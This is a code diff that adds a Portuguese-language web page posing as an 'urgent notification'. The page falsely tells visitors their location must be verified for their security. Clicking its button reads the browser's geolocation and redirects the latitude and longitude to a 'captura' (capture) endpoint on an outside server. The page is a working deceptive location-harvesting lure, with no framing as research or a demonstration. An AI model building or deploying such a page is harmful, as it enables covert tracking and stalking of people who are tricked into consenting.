@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notificação Urgente</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f7f7f7;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 400px;
+            text-align: center;
+        }
+        h1 {
+            color: #d9534f;
+            font-size: 24px;
+        }
+        p {
+            color: #555;
+            margin: 15px 0;
+        }
+        button {
+            background-color: #d9534f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #c9302c;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Notificação Urgente</h1>
+        <p>Para sua segurança, precisamos verificar sua localização atual. Clique no botão abaixo para continuar.</p>
+        <button onclick="getLocation()">Verificar Localização</button>
+        <p id="demo"></p>
+    </div>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById("demo").innerHTML = "Geolocalização não é suportada por este navegador.";
+            }
+        }
+
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            // Redireciona para o servidor com as coordenadas
+            window.location.href = `https://meusite.com/captura?lat=${lat}&lon=${lon}`;
+        }
+
+        function showError(error) {
+            let message;
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    message = "Permissão negada. Não podemos verificar sua localização.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = "Informações de localização indisponíveis.";
+                    break;
+                case error.TIMEOUT:
+                    message = "A solicitação de localização expirou.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    message = "Um erro desconhecido ocorreu.";
+                    break;
+            }
+            document.getElementById("demo").innerHTML = message;
+        }
+    </script>
+</body>
+</html>
